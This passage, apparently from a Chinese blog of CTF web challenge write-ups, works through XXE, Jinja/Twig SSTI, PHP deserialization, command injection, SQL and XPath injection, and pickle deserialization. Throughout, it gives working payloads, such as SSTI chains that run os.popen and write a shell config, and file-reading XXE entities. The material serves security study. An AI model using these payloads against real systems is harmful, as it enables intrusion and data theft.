class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>  //声明此文档的所有元素</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  //定义to元素的类型为PCDATA</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  // 定义from元素类型为PCDATA</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span> // 定义heading为PCDATA</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  // 定义body为PCDATA</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="string">&quot;hello world&quot;</span>&gt;</span> // 定义一个内部实体</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">外部</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span> #定义元素为ANY，即可以接受任何元素。</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span> // 定义通用实体</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span> #定义一个外部实体</span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="判读是否存在XXE漏洞："><a href="#判读是否存在XXE漏洞：" class="headerlink" title="判读是否存在XXE漏洞："></a>判读是否存在XXE漏洞：</h5><p><strong>最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞</strong></p><p>总共有三个文件可以解析就是do m.php,SimpleXMLElement.php,simplexml_load_string.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//dom.php文件源码</span><br><span class="line">&lt;?php</span><br><span class="line">$data = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line"></span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($data);</span><br><span class="line"></span><br><span class="line">print_r($dom);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后构造一下payload，读取flagggg.php中的flag，然后base64解码</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flagggg.php&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-27 14.29.40.png" alt="截屏2025-02-27 14.29.40" style="zoom:25%;" /></p><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>php常见的模板：twig，smarty，blade</p><p>可以使用<a href="https://github.com/epinna/tplmap"><code>tplmap</code></a>一把梭。</p><ul><li><p>注入思路：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>随便找一个内置类对象用__c1ass__拿到他所对应的类</span><br><span class="line"><span class="number">2.</span>用__bases__拿到基类(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"><span class="number">3.</span>用__subclasses__()拿到子类列表</span><br><span class="line"><span class="number">4.</span>在子类列表中直接寻找可以利用的类getshell</span><br><span class="line"></span><br><span class="line">对象-&gt; 类-&gt; 基本类-&gt; 子类-&gt; __init__方法-&gt; __globals__属性+_bui1tins属性-&gt; </span><br><span class="line"><span class="built_in">eval</span>函数</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">().__class__.__mro__[<span class="number">2</span>].__subclasses__()</span><br><span class="line">request.__class__.__mro__[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><ul><li><p>常用方法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__mro__             <span class="comment"># 查看继承关系和调用顺序，返回元组</span></span><br><span class="line">__base__            <span class="comment"># 返回基类</span></span><br><span class="line">__bases__           <span class="comment"># 返回基类元组</span></span><br><span class="line">__subclasses__()    <span class="comment"># 返回子类列表</span></span><br><span class="line">__init__            <span class="comment"># 调用初始化函数，可以用来跳到__globals__</span></span><br><span class="line">__globals__         <span class="comment"># 返回函数所在的全局命名空间所定义的全局变量，返回字典</span></span><br><span class="line">__builtins__        <span class="comment"># 返回内建内建名称空间字典</span></span><br><span class="line">__dic__             <span class="comment"># 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都</span></span><br><span class="line">是放在类的__dict__里</span><br><span class="line">__getattribute__()  <span class="comment"># 实例、类、函数都具有的__getattribute__魔术方法。事实上，</span></span><br><span class="line">在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）都会自动去调用__getattribute__</span><br><span class="line">方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        <span class="comment"># 调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，</span></span><br><span class="line">就是a.__getitem__(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">__builtins__         <span class="comment"># 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名</span></span><br><span class="line">字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。</span><br><span class="line">__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line"><span class="built_in">__import__</span>           <span class="comment"># 动态加载类和函数，也就是导入模块，经常用于导入os模块，</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line">__str__()            <span class="comment"># 返回描写这个对象的字符串，可以理解成就是打印出来。</span></span><br><span class="line">url_for              <span class="comment"># flask的一个方法，可以用于得到__builtins__，而且</span></span><br><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app</span><br><span class="line">get_flashed_messages <span class="comment"># flask的一个方法，可以用于得到__builtins__，而且</span></span><br><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app</span><br><span class="line">lipsum               <span class="comment"># flask的一个方法，可以用于得到__builtins__，而且</span></span><br><span class="line">lipsum.__globals__含有os模块：&#123;&lt;!-- --&gt;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">.read()&#125;&#125;</span><br><span class="line">&#123;&lt;!-- --&gt;&#123;cycler.__init__.__globals__.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">current_app          <span class="comment"># 应用上下文，一个全局变量</span></span><br><span class="line">request              <span class="comment"># 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。</span></span><br><span class="line">此外，同样可以获取<span class="built_in">open</span>函数:request.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line">.<span class="built_in">open</span>(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1        <span class="comment"># get传参</span></span><br><span class="line">request.values.x1      <span class="comment"># 所有参数</span></span><br><span class="line">request.cookies          <span class="comment"># cookies参数</span></span><br><span class="line">request.headers          <span class="comment"># 请求头参数</span></span><br><span class="line">request.form.x1        <span class="comment"># post传参    (Content-Type:applicaation</span></span><br><span class="line">/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data           <span class="comment"># post传参    (Content-Type:a/b)</span></span><br><span class="line">request.json         <span class="comment"># post传json  (Content-Type: application/json)</span></span><br><span class="line">config                   <span class="comment"># 当前application的所有配置。此外，也可以这样&#123;&lt;!-- --&gt;</span></span><br><span class="line">&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>过滤器：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">float</span>()            <span class="comment"># 将值转换为float类型；</span></span><br><span class="line">lower()            <span class="comment"># 将字符串转换为小写；</span></span><br><span class="line">upper()            <span class="comment"># 将字符串转换为大写；</span></span><br><span class="line">title()            <span class="comment"># 把值中的每个单词的首字母都转成大写；</span></span><br><span class="line">capitalize()        <span class="comment"># 把变量值的首字母转成大写，其余字母转小写；</span></span><br><span class="line">trim()            <span class="comment"># 截取字符串前面和后面的空白字符；</span></span><br><span class="line">wordcount()        <span class="comment"># 计算一个长字符串中单词的个数；</span></span><br><span class="line">reverse()        <span class="comment"># 字符串反转；</span></span><br><span class="line">replace(value,old,new)                        <span class="comment"># 替换将old替换为new的字符串；</span></span><br><span class="line">truncate(value,length=<span class="number">255</span>,killwords=<span class="literal">False</span>)  <span class="comment"># 截取length长度的字符串；</span></span><br><span class="line">striptags()       <span class="comment"># 删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span></span><br><span class="line">escape()或e       <span class="comment"># 转义字符，会将&amp;lt;、&amp;gt;等符号转义成HTML中的符号。显例：</span></span><br><span class="line">content|escape或content|e。</span><br><span class="line">safe()        <span class="comment"># 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。</span></span><br><span class="line">示例： &#123;&lt;!-- --&gt;&#123;<span class="string">&#x27;&amp;lt;em&amp;gt;hello&amp;lt;/em&amp;gt;&#x27;</span>|safe&#125;&#125;；</span><br><span class="line"><span class="built_in">list</span>()        <span class="comment"># 将变量列成列表；</span></span><br><span class="line">string()    <span class="comment"># 将变量转换成字符串；</span></span><br><span class="line">join()        <span class="comment"># 将一个序列中的参数值拼接成字符串。示例看上面payload；</span></span><br><span class="line"><span class="built_in">abs</span>()        <span class="comment"># 返回一个数值的绝对值；</span></span><br><span class="line">first()        <span class="comment"># 返回一个序列的第一个元素；</span></span><br><span class="line">last()        <span class="comment"># 返回一个序列的最后一个元素；</span></span><br><span class="line"><span class="built_in">format</span>(value,arags,*kwargs)    <span class="comment"># 格式化字符串。比如：&#123;&lt;!-- --&gt;&#123;&quot;%s&quot; - &quot;%s&quot;|</span></span><br><span class="line"><span class="built_in">format</span>(<span class="string">&#x27;Hello?&#x27;</span>,<span class="string">&quot;Foo!&quot;</span>) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line">length()    <span class="comment"># 返回一个序列或者字典的长度；</span></span><br><span class="line"><span class="built_in">sum</span>()        <span class="comment"># 返回列表内数值的和；</span></span><br><span class="line">sort()        <span class="comment"># 返回排序后的列表；</span></span><br><span class="line">default(value,default_value,boolean=false)    <span class="comment"># 如果当前变量没有值，则会使用参</span></span><br><span class="line">数中的值来代替。示例：name|default(<span class="string">&#x27;xiaotuo&#x27;</span>)----如果name不存在，则会使用xiaotuo来</span><br><span class="line">替代。boolean=<span class="literal">False</span>默认是在只有这个变量为undefined的时候才会使用default中的值，如果</span><br><span class="line">想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用<span class="keyword">or</span>来替换。</span><br><span class="line">length()    <span class="comment"># 返回字符串的长度，别名是count</span></span><br></pre></td></tr></table></figure></li><li><p>找可用利用的类：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这是个找可利用类的脚本，可供自行发掘利用链，想利用啥，就找啥</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;os&#x27;</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line">class_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            class_name = <span class="built_in">str</span>(i).split(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">            <span class="built_in">print</span>(class_name, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> class_name:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;未找到含有“%s”的类，请尝试用其他包查找...&#x27;</span> % search)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li><li><p>常用poc：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/shell.cfg&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">.write(<span class="string">&#x27;from subprocess import check_output\n\nRUNCMD = check_output\n&#x27;</span>)&#125;&#125;           <span class="comment"># 返回None证明传递成功</span></span><br><span class="line">&#123;&#123;config.from_pyfile(<span class="string">&#x27;/tmp/shell.cfg&#x27;</span>)&#125;&#125;                     <span class="comment"># 返回True说明成功</span></span><br><span class="line">写shell</span><br><span class="line">&#123;&#123;config[<span class="string">&#x27;RUNCMD&#x27;</span>](<span class="string">&#x27;[shell_cmd_here]&#x27;</span>,shell=<span class="literal">True</span>)&#125;&#125;          <span class="comment"># 执行想要的shell</span></span><br><span class="line">命令</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals</span><br><span class="line">.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>]</span><br><span class="line">.__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">&#123;&#123;request[<span class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>].__base__.__base__.__base</span><br><span class="line">__[<span class="string">&#x27;__subcla&#x27;</span>+<span class="string">&#x27;sses__&#x27;</span>]()[<span class="number">60</span>][<span class="string">&#x27;__in&#x27;</span>+<span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__&#x27;</span>+<span class="string">&#x27;glo&#x27;</span>+<span class="string">&#x27;bal&#x27;</span>+<span class="string">&#x27;s__&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;__bu&#x27;</span>+<span class="string">&#x27;iltins__&#x27;</span>][<span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span>](<span class="string">&#x27;__im&#x27;</span>+<span class="string">&#x27;port__(&quot;os&quot;).po&#x27;</span>+<span class="string">&#x27;pen(&quot;ca&quot;+&quot;t a.php&quot;)</span></span><br><span class="line"><span class="string">.re&#x27;</span>+<span class="string">&#x27;ad()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure></li></ul></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">　　<span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line">　　<span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line">　　<span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line">　　<span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]));  <span class="comment">// 将用户输入作为模版变量的值</span></span><br><span class="line">　　<span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。</p><p>其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p><p>使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于GET请求参数$_GET[“name”] 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">魔术方法</span><br><span class="line">__class__   ：返回类型所属的对象</span><br><span class="line">__mro__     ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   ：返回该对象所继承的父类</span><br><span class="line">__mro__     ：返回该对象的所有父类</span><br><span class="line"></span><br><span class="line">__subclasses__()  获取当前类的所有子类</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含(保存)函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><p>构造payload<code>&#123;&#123;lipsum.__globals__.__builtins__.__import__('os').popen('cat /f*').read()&#125;&#125;</code>得到flag</p><h3 id="PlayGame"><a href="#PlayGame" class="headerlink" title="PlayGame"></a>PlayGame</h3><p>首先分析源码，pop链是<code>PlayGame.__destruct -&gt; User.__toString -&gt; PlayGame.__toString -&gt; PlayGame.openGame()</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-27 21.14.22.png" alt="截屏2025-02-27 21.14.22" style="zoom:50%;" /></p><ul><li>1、反序列化链的入口在魔法函数 <strong>destruct() ，调用对象后会立即触发 </strong>destruct() 函数输出$this-&gt;user-&gt;name.”GameOver!”。</li><li>2、 $this-&gt;user-&gt;name、$gameFile 两个参数可控，出口在 __toString() 函数，只有对象转换为字符时才会被调用，才会进入 openGame() 函数执行 file_get_contents($this-&gt;gameFile) ，去包含想要的文件。</li><li>3、flag文件路径未知，要怎么获取？</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exp</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PlayGame</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gameFile</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">PlayGame</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">PlayGame</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;name=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;user=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;gameFile=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">O:<span class="number">8</span>:<span class="string">&quot;PlayGame&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;PlayGame&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;gameFile&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;sex&quot;</span>;N;&#125;s:<span class="number">8</span>:<span class="string">&quot;gameFile&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>构造payload<code>?polar[flag.flag=O:8:&quot;PlayGame&quot;:2:&#123;s:4:&quot;user&quot;;O:4:&quot;User&quot;:3:&#123;s:4:&quot;name&quot;;O:8:&quot;PlayGame&quot;:2:&#123;s:4:&quot;user&quot;;N;s:8:&quot;gameFile&quot;;s:5:&quot;/flag&quot;;&#125;s:3:&quot;age&quot;;N;s:3:&quot;sex&quot;;N;&#125;s:8:&quot;gameFile&quot;;N;&#125;</code>得到flag</p><h3 id="phpurl"><a href="#phpurl" class="headerlink" title="phpurl"></a>phpurl</h3><p>先把提示的内容<code>`aW5kZXgucGhwcw</code>用base64进行解码，得到<code>index.phps</code>,然后访问<code>index.phps</code></p><p>得到源码，进行分析，发现GET方法传入一个sys参数，然后用urlecode()进行加密了后面又判断了sys与xxs是否相等，那么看看经过多次url编码是否能获得flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 14.12.47.png" alt="截屏2025-02-28 14.12.47" style="zoom:50%;" /></p><p>构造payload<code>?sys=%25%37%38%25%37%38%25%37%33</code>,发现获得了flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 14.14.41.png" alt="截屏2025-02-28 14.14.41" style="zoom:25%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 14.15.00.png" alt="截屏2025-02-28 14.15.00" style="zoom:25%;" /></p><h3 id="再来ping一波啊"><a href="#再来ping一波啊" class="headerlink" title="再来ping一波啊"></a>再来ping一波啊</h3><p>首先是一个输入框，看题目的描述，试一下<code>127.0.0.1;id</code>发现可以返回，但是<code>tac</code>不可以执行,应该是过滤了，但是又不知道flag在哪，查看一下<code>t\ac%09index.php</code>发现返回了”那能让你直接读？”,那么就先读取index.php查看一下源码吧，构造一下payload <code>?ip=127.0.0.1;a=ind;b=ex;ta\c%09$a$b.php</code>访问网站看一下源码发现了flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 14.31.48.png" alt="截屏2025-02-28 14.31.48" style="zoom:25%;" /></p><h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>首先是一个输入框，一眼sql注入啊，发现是一个POST的参数，那么直接测试</p><p>本题过滤了空格，那么直接/**/替换一下</p><p>sql注入步骤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 首先是判断有几个字段：&#x27;order by 1#</span><br><span class="line">2. 判断完之后直接用语句看看哪一个字段执行了返回了数据: &#x27;Union/**/Select/**/1,2,3,4,5#</span><br><span class="line">3. 直接查看数据库：&#x27;Union/**/Select/**/1,database(),3,4,5#</span><br><span class="line">4. 查看表名具体要分析一下：group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+ </span><br><span class="line">5. 查看列名：group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line">6.查看字段值：group_concat(id,username,password) from users --+</span><br></pre></td></tr></table></figure><p>查看表名<code>query=&#39;/**/Union/**/Select/**/1,group_concat(table_name),3,4,5/**/From/**/information_schema.tables/**/whEre/**/table_schema=database()/**/#</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 15.22.28.png" alt="截屏2025-02-28 15.22.28" style="zoom:25%;" /></p><p>查看列名<code>query=1&#39;/**/Union/**/Select/**/1,group_concat(column_name),3,4,5/**/From/**/information_schema.columns/**/whEre/**/table_schema=database()/**/and/**/table_name=&#39;Flag&#39;/**/#</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 15.22.04.png" alt="截屏2025-02-28 15.22.04" style="zoom:25%;" /></p><p>查看字段值<code>query=&#39;/**/Union/**/Select/**/1,group_concat(Flag),3,4,5/**/fRom/**/Flag/**/#</code></p><p>得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 15.21.07.png" alt="截屏2025-02-28 15.21.07" style="zoom:50%;" /></p><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>首先判断了一下sql注入发现不是，考虑一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Xpath注入利用Xpath解析器的松散输入和容错 i 特性，能够在URL、表单或其他信息上附带恶意的</span><br><span class="line">XPath查询代码，以获得高权限的访问权</span><br><span class="line"> Xpath注入类似于SQL注入，当网站实验未经正确处理的用户输入查询XML数据时，可能发生XPATH注入，</span><br><span class="line">由于Xpath种不像sql种有权限的概念，用户可通过提交恶意XPATH代码获得完整的xml文档权限。</span><br></pre></td></tr></table></figure><ul><li>payload：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;]|//*|//*[&#x27;</span><br><span class="line">&#x27;]|//*|ss[&#x27;</span><br><span class="line">&#x27;]|//*|//*[&#x27;</span><br><span class="line">&#x27;]|//*|*[&#x27;</span><br></pre></td></tr></table></figure><h3 id="csdn"><a href="#csdn" class="headerlink" title="csdn"></a>csdn</h3><p>访问URL直接查看源码发现，直接构造payload<code>?xxs=file:///flag.txt</code>得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 16.39.46.png" alt="截屏2025-02-28 16.39.46" style="zoom:50%;" /></p><h3 id="unpickle"><a href="#unpickle" class="headerlink" title="unpickle"></a>unpickle</h3><p>查看附件发现是一个pickle反序列化，但是从cookie处打入的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">return</span> user</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span 